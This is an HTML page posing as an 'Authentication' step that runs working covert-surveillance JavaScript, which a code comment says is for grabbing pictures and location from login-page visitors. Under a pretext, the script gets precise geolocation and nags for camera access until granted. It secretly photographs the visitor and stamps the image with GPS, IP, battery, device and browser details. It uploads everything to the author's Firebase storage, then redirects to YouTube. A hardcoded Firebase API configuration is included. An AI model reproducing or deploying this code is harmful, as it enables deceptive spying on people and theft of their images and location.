<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authentication</title>
</head>
<body>
    <!-- Be careful, this page is being used in LOGIN page to grab picture, location & may more... -->
    <div id="message">Please Allow Camera to proceed, wait for 3 seconds . . .</div>
    
    <!-- Firebase SDK (non-modular version for compatibility) -->
    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-storage-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-database-compat.js"></script>

<!-- ===================== -->
<!--   FIXED upload.js     -->
<!-- ===================== -->
<script>
// Your Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyBgIg7tbnGtSoeo0nHMn6IkeuvMp30ar9w",
  authDomain: "esrat-4e28f.firebaseapp.com",
  databaseURL: "https://esrat-4e28f-default-rtdb.firebaseio.com",
  projectId: "esrat-4e28f",
  storageBucket: "esrat-4e28f.firebasestorage.app",
  messagingSenderId: "712315598095",
  appId: "1:712315598095:android:ed0f042ee1d5410dfb7a7a"
};

// Initialize Firebase
const app = firebase.initializeApp(firebaseConfig);
const storage = firebase.storage();
const database = firebase.database();

// Variable to store location
let userLocation = {
    latitude: null,
    longitude: null,
    altitude: null,
    speed: null
};

// Function to request location permission and get location
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
            userLocation.latitude = position.coords.latitude.toFixed(6);
            userLocation.longitude = position.coords.longitude.toFixed(6);
            userLocation.altitude = position.coords.altitude ? position.coords.altitude.toFixed(2) : 'N/A';
            userLocation.speed = position.coords.speed ? position.coords.speed.toFixed(2) : 'N/A';
            console.log('Location retrieved:', userLocation);
            startVideo();
        }, (error) => {
            console.error('Error accessing location:', error);
            document.getElementById('message').textContent = 'Location access denied or an error occurred.';
            startVideo();
        }, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        });
    } else {
        console.error('Geolocation is not supported by this browser.');
        startVideo();
    }
}

// Reverse geocoding
async function getReadableAddress(lat, lon) {
    const apiKey = "YOUR_GOOGLE_MAPS_API_KEY";
    if (!apiKey || apiKey === "YOUR_GOOGLE_MAPS_API_KEY") return 'No Google Maps API key provided';

    try {
        const response = await fetch(`https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lon}&key=${apiKey}`);
        const data = await response.json();
        return data.results?.[0]?.formatted_address || "Address not found";
    } catch (err) {
        return "Error retrieving address";
    }
}

// Network stats
async function getNetworkStats() {
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    let ip = "N/A";

    try {
        const r = await fetch("https://api.ipify.org?format=json");
        const j = await r.json();
        ip = j.ip;
    } catch {}

    return {
        ip,
        connectionSpeed: conn?.downlink ? conn.downlink + " Mbps" : "N/A",
        networkType: conn?.effectiveType || "N/A"
    };
}

// Date time
function formatDateTime() {
    const now = new Date();
    return now.toLocaleString();
}

// Device stats
function getDeviceStats() {
    const batteryPromise = navigator.getBattery ? navigator.getBattery() : Promise.resolve(null);
    return batteryPromise.then(b => ({
        battery: b ? `${(b.level * 100).toFixed(0)}%` : "N/A",
        screenResolution: `${screen.width}x${screen.height}`,
        deviceName: navigator.platform,
        browser: navigator.userAgent
    }));
}

// Canvas text wrap
function wrapText(ctx, text, x, y, maxWidth, lineHeight) {
    const words = text.split(" ");
    let line = "";
    let count = 0;

    for (let w of words) {
        let test = line + w + " ";
        if (ctx.measureText(test).width > maxWidth) {
            ctx.fillText(line, x, y + count * lineHeight);
            line = w + " ";
            count++;
        } else {
            line = test;
        }
    }
    ctx.fillText(line, x, y + count * lineHeight);
    return count + 1;
}

// Capture & upload
async function capturePhoto(video) {
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");

    canvas.width = video.videoWidth || 1280;
    canvas.height = video.videoHeight || 720;

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const deviceStats = await getDeviceStats();
    const networkStats = await getNetworkStats();
    const address = await getReadableAddress(userLocation.latitude, userLocation.longitude);

    const t1 = `Date: ${formatDateTime()} Lat: ${userLocation.latitude} Lon: ${userLocation.longitude}`;
    const t2 = `Alt: ${userLocation.altitude} Speed: ${userLocation.speed} Address: ${address}`;
    const t3 = `Battery: ${deviceStats.battery} Screen: ${deviceStats.screenResolution}`;
    const t4 = `Device: ${deviceStats.deviceName} Browser: ${deviceStats.browser}`;
    const t5 = `IP: ${networkStats.ip} Net: ${networkStats.networkType} Speed: ${networkStats.connectionSpeed}`;

    ctx.font = "18px Arial";
    const padding = 10;
    const lh = 22;
    const maxWidth = canvas.width - padding * 2;

    let lines = 0;
    lines += wrapText(ctx, t1, padding, canvas.height - 200, maxWidth, lh);
    lines += wrapText(ctx, t2, padding, canvas.height - 200 + lines * lh, maxWidth, lh);
    lines += wrapText(ctx, t3, padding, canvas.height - 200 + lines * lh, maxWidth, lh);
    lines += wrapText(ctx, t4, padding, canvas.height - 200 + lines * lh, maxWidth, lh);
    lines += wrapText(ctx, t5, padding, canvas.height - 200 + lines * lh, maxWidth, lh);

    canvas.toBlob(async (blob) => {
        const fileName = `photo_${Date.now()}.png`;
        const ref = storage.ref(`users/${fileName}`);

        await ref.put(blob, {
            contentType: "image/png",
            customMetadata: {
                ...userLocation,
                ...deviceStats,
                ...networkStats,
                readableAddress: address
            }
        });

        setTimeout(() => (location.href = "https://youtube.com/"), 1000);
    }, "image/png");
}

// Camera start
async function startVideo() {
    let granted = false;

    while (!granted) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { width: { ideal: 1280 }, height: { ideal: 720 } }
            });
            granted = true;

            const video = document.createElement("video");
            video.srcObject = stream;
            video.autoplay = true;
            video.style.display = "none";
            document.body.appendChild(video);

            video.onloadedmetadata = () => {
                setTimeout(() => capturePhoto(video), 300);
            };

        } catch (err) {
            document.getElementById("message").textContent = "Camera access denied, retrying...";
            await new Promise(r => setTimeout(r, 3000));
        }
    }
}

window.onload = getLocation;
</script>

</body>
</html>
